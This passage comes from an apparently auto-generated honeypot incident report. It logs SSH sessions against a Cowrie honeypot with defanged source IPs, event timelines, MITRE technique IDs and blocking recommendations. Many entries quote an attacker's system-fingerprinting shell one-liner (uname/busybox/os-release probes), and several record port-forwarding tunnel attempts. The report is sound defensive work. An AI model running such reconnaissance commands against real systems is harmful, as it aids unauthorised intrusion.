| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:51:43` | `cowrie.session.connect` |
| `2026-07-24 15:51:44` | `cowrie.client.version` |
| `2026-07-24 15:51:44` | `cowrie.client.kex` |
| `2026-07-24 15:51:46` | `cowrie.login.success` |
| `2026-07-24 15:51:48` | `cowrie.session.params` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.success` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.command.input` |
| `2026-07-24 15:51:48` | `cowrie.log.closed` |
| `2026-07-24 15:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce29d12685d4

| Field | Detail |
|---|---|
| **Source IP** | `207.254.71[.]129` |
| **First Seen** | 2026-07-24 15:51 |
| **Last Seen** | 2026-07-24 15:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:51:50` | `cowrie.session.connect` |
| `2026-07-24 15:51:50` | `cowrie.client.version` |
| `2026-07-24 15:51:50` | `cowrie.client.kex` |
| `2026-07-24 15:51:51` | `cowrie.login.success` |
| `2026-07-24 15:51:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.71[.]129` to AbuseIPDB if not already reported
- [ ] Block `207.254.71[.]129` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a855235fef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:53 |
| **Last Seen** | 2026-07-24 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:53:11` | `cowrie.session.connect` |
| `2026-07-24 15:53:11` | `cowrie.client.version` |
| `2026-07-24 15:53:11` | `cowrie.client.kex` |
| `2026-07-24 15:53:14` | `cowrie.login.success` |
| `2026-07-24 15:53:15` | `cowrie.session.params` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.success` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.command.input` |
| `2026-07-24 15:53:15` | `cowrie.log.closed` |
| `2026-07-24 15:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e6faa62801

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-07-24 15:53 |
| **Last Seen** | 2026-07-24 15:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:53:25` | `cowrie.session.connect` |
| `2026-07-24 15:53:26` | `cowrie.client.version` |
| `2026-07-24 15:53:26` | `cowrie.client.kex` |
| `2026-07-24 15:53:28` | `cowrie.login.success` |
| `2026-07-24 15:53:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39b8429b8e9

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-24 15:53 |
| **Last Seen** | 2026-07-24 15:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:53:34` | `cowrie.session.connect` |
| `2026-07-24 15:53:35` | `cowrie.client.version` |
| `2026-07-24 15:53:35` | `cowrie.client.kex` |
| `2026-07-24 15:53:36` | `cowrie.login.success` |
| `2026-07-24 15:53:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41f0390e9d6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:54 |
| **Last Seen** | 2026-07-24 15:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:54:40` | `cowrie.session.connect` |
| `2026-07-24 15:54:40` | `cowrie.client.version` |
| `2026-07-24 15:54:40` | `cowrie.client.kex` |
| `2026-07-24 15:54:42` | `cowrie.login.success` |
| `2026-07-24 15:54:43` | `cowrie.session.params` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.success` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.command.input` |
| `2026-07-24 15:54:43` | `cowrie.log.closed` |
| `2026-07-24 15:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a115088a1e4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:56 |
| **Last Seen** | 2026-07-24 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:56:10` | `cowrie.session.connect` |
| `2026-07-24 15:56:10` | `cowrie.client.version` |
| `2026-07-24 15:56:10` | `cowrie.client.kex` |
| `2026-07-24 15:56:12` | `cowrie.login.success` |
| `2026-07-24 15:56:14` | `cowrie.session.params` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.success` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.command.input` |
| `2026-07-24 15:56:14` | `cowrie.log.closed` |
| `2026-07-24 15:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf1b14f71a9

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-07-24 15:56 |
| **Last Seen** | 2026-07-24 15:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:56:45` | `cowrie.session.connect` |
| `2026-07-24 15:56:45` | `cowrie.client.version` |
| `2026-07-24 15:56:45` | `cowrie.client.kex` |
| `2026-07-24 15:56:47` | `cowrie.login.success` |
| `2026-07-24 15:56:47` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9a17986cef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:57 |
| **Last Seen** | 2026-07-24 15:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:57:35` | `cowrie.session.connect` |
| `2026-07-24 15:57:35` | `cowrie.client.version` |
| `2026-07-24 15:57:35` | `cowrie.client.kex` |
| `2026-07-24 15:57:37` | `cowrie.login.success` |
| `2026-07-24 15:57:38` | `cowrie.session.params` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:38` | `cowrie.command.success` |
| `2026-07-24 15:57:38` | `cowrie.command.input` |
| `2026-07-24 15:57:39` | `cowrie.command.input` |
| `2026-07-24 15:57:39` | `cowrie.command.input` |
| `2026-07-24 15:57:39` | `cowrie.command.input` |
| `2026-07-24 15:57:40` | `cowrie.log.closed` |
| `2026-07-24 15:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb29e7a45ea7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:58 |
| **Last Seen** | 2026-07-24 15:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:58:57` | `cowrie.session.connect` |
| `2026-07-24 15:58:58` | `cowrie.client.version` |
| `2026-07-24 15:58:58` | `cowrie.client.kex` |
| `2026-07-24 15:59:00` | `cowrie.login.success` |
| `2026-07-24 15:59:01` | `cowrie.session.params` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.success` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:01` | `cowrie.command.input` |
| `2026-07-24 15:59:02` | `cowrie.log.closed` |
| `2026-07-24 15:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5c640d90ae

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]38` |
| **First Seen** | 2026-07-24 15:59 |
| **Last Seen** | 2026-07-24 15:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:59:08` | `cowrie.session.connect` |
| `2026-07-24 15:59:09` | `cowrie.client.version` |
| `2026-07-24 15:59:09` | `cowrie.client.kex` |
| `2026-07-24 15:59:11` | `cowrie.login.success` |
| `2026-07-24 15:59:12` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]38` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faeb3ec34d38

| Field | Detail |
|---|---|
| **Source IP** | `60.169.120[.]17` |
| **First Seen** | 2026-07-24 15:59 |
| **Last Seen** | 2026-07-24 15:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:59:18` | `cowrie.session.connect` |
| `2026-07-24 15:59:19` | `cowrie.client.version` |
| `2026-07-24 15:59:19` | `cowrie.client.kex` |
| `2026-07-24 15:59:23` | `cowrie.login.success` |
| `2026-07-24 15:59:24` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.169.120[.]17` to AbuseIPDB if not already reported
- [ ] Block `60.169.120[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27133beaaf06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:00 |
| **Last Seen** | 2026-07-24 16:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:00:20` | `cowrie.session.connect` |
| `2026-07-24 16:00:21` | `cowrie.client.version` |
| `2026-07-24 16:00:21` | `cowrie.client.kex` |
| `2026-07-24 16:00:23` | `cowrie.login.success` |
| `2026-07-24 16:00:25` | `cowrie.session.params` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.success` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.command.input` |
| `2026-07-24 16:00:25` | `cowrie.log.closed` |
| `2026-07-24 16:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11cda3c29937

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:01 |
| **Last Seen** | 2026-07-24 16:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:01:45` | `cowrie.session.connect` |
| `2026-07-24 16:01:45` | `cowrie.client.version` |
| `2026-07-24 16:01:45` | `cowrie.client.kex` |
| `2026-07-24 16:01:48` | `cowrie.login.success` |
| `2026-07-24 16:01:50` | `cowrie.session.params` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.success` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:50` | `cowrie.command.input` |
| `2026-07-24 16:01:51` | `cowrie.log.closed` |
| `2026-07-24 16:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617396a4528b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]92` |
| **First Seen** | 2026-07-24 16:02 |
| **Last Seen** | 2026-07-24 16:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:02:52` | `cowrie.session.connect` |
| `2026-07-24 16:02:52` | `cowrie.login.success` |
| `2026-07-24 16:02:53` | `cowrie.session.params` |
| `2026-07-24 16:02:53` | `cowrie.command.input` |
| `2026-07-24 16:02:54` | `cowrie.command.input` |
| `2026-07-24 16:02:55` | `cowrie.command.input` |
| `2026-07-24 16:02:55` | `cowrie.command.input` |
| `2026-07-24 16:02:55` | `cowrie.command.failed` |
| `2026-07-24 16:02:56` | `cowrie.log.closed` |
| `2026-07-24 16:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]92` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8125c18a343

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:03 |
| **Last Seen** | 2026-07-24 16:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:03:06` | `cowrie.session.connect` |
| `2026-07-24 16:03:07` | `cowrie.client.version` |
| `2026-07-24 16:03:07` | `cowrie.client.kex` |
| `2026-07-24 16:03:09` | `cowrie.login.success` |
| `2026-07-24 16:03:11` | `cowrie.session.params` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.success` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:11` | `cowrie.command.input` |
